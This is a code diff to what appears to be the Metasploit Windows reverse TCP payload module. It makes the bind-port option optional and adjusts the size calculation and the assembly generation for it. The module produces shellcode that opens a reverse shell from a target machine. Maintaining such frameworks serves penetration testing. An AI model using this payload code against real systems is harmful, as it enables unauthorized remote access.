@@ -27,7 +27,7 @@ module Payload::Windows::ReverseTcp
   #
   def initialize(*args)
     super
-    register_advanced_options([ OptString.new('PayloadBindPort', [false, 'Port to bind reverse tcp socket to on target system.', '0']) ], self.class)
+    register_advanced_options([ OptString.new('PayloadBindPort', [false, 'Port to bind reverse tcp socket to on target system.']) ], self.class)
   end
 
   #
@@ -87,6 +87,9 @@ module Payload::Windows::ReverseTcp
     # Start with our cached default generated size
     space = cached_size
 
+    # Bind port bytes, adds 35 bytes.
+    space += 35
+
     # EXITFUNK 'thread' is the biggest by far, adds 29 bytes.
     space += 29
 
@@ -108,9 +111,6 @@ module Payload::Windows::ReverseTcp
   #
   def asm_reverse_tcp(opts={})
 
-    bind_port    = opts[:bind_port]
-    
-    encoded_bind_port = "0x%.8x" % [bind_port.to_i,2].pack("vn").unpack("N").first
     retry_count  = [opts[:retry_count].to_i, 1].max
     encoded_port = "0x%.8x" % [opts[:port].to_i,2].pack("vn").unpack("N").first
     encoded_host = "0x%.8x" % Rex::Socket.addr_aton(opts[:host]||"127.127.127.127").unpack("V").first
@@ -158,7 +158,9 @@ module Payload::Windows::ReverseTcp
         xchg edi, eax           ; save the socket for later, don't care about the value of eax after this
     ^
     # Check if a bind port was specified
-    if bind_port != 0
+    if opts[:bind_port]
+      bind_port    = opts[:bind_port]
+      encoded_bind_port = "0x%.8x" % [bind_port.to_i,2].pack("vn").unpack("N").first
       asm << %Q^
         xor eax, eax
         push 11
